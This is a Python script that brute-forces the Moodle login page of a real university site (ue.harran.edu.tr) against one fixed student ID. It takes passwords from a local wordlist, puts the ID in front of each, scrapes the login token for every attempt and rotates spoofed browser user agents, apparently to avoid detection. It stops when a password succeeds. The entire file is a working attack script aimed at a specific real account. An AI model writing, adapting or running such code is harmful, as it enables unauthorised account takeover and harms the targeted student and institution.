import requests, math, random

#"sTcHrYbv"
user_agents = [
    'Mozilla/5.0 (Linux; Android 8.0.0; SM-G960F Build/R16NW) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/62.0.3202.84 Mobile Safari/537.36',
    'Mozilla/5.0 (Linux; Android 7.0; SM-G892A Build/NRD90M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/60.0.3112.107 Mobile Safari/537.36',
    'Mozilla/5.0 (iPhone; CPU iPhone OS 12_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/12.0 Mobile/15E148 Safari/604.1',
    'Mozilla/5.0 (iPhone; CPU iPhone OS 11_0 like Mac OS X) AppleWebKit/604.1.38 (KHTML, like Gecko) Version/11.0 Mobile/15A372 Safari/604.1',
    'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/44.0.2403.157 Safari/537.36',
    'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/47.0.2526.111 Safari/537.36',
    'Mozilla/5.0 (Windows NT 6.1; Win64; x64; Trident/7.0; rv:11.0) like Gecko',
    'Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.1; WOW64; Trident/6.0)',
    'Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.1; Trident/6.0)',
    'Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0; .NET CLR 2.0.50727; .NET CLR 3.0.4506.2152; .NET CLR 3.5.30729)']
    
def getToken(m):
    m=m.split("\n")
    m=m[64]
    t=m.split("value=\"")[1].replace("\">","")
    return t
    
def run(sifre,token,user):
    headers = {
    'User-Agent': user_agents[user],
    'From': 'https://ue.harran.edu.tr/login/index.php'
    # This is another valid field
}
    veri={
"anchor":"",
"logintoken": token,
"username": "170504001",
"password": sifre,
}

    r=requests.post("https://ue.harran.edu.tr/login/index.php", data= veri, headers=headers)
    
    if  "Hatal" in r.text:
        print(str(no)+", ",flush=True, end="")
    else:
        
        print()
        print(sifre)
        quit()

f=open("pass.txt","r")
ff=f.readlines()
f.close()

print('basladi')

for no,i in enumerate(ff):
   # if no < 2300:
#      continue
    i=i.strip()
    user=math.ceil(random.random()*10)-1
    r=requests.get("https://ue.harran.edu.tr/login/index.php", headers= {
    'User-Agent': user_agents[user],
    'From': 'https://ue.harran.edu.tr/login/index.php'})
    token=getToken(r.text)
    run( "170504001" + i, token,user)
    
   
